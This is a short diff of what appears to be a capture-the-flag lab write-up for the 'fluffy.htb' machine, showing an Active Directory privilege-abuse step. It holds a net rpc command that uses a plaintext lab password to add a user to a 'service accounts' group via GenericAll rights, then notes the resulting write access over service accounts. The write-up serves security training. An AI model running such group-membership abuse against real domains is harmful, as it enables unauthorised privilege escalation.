@@ -320,3 +320,5 @@ So i have GenericAll over the service accounts group
 net rpc group addmem "service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%'prometheusx-303' -S "dc01.fluffy.htb"
 ```
 
+![[Pasted image 20260324184011.png]]
+Now im part of the group i have genericWrite over three service accounts
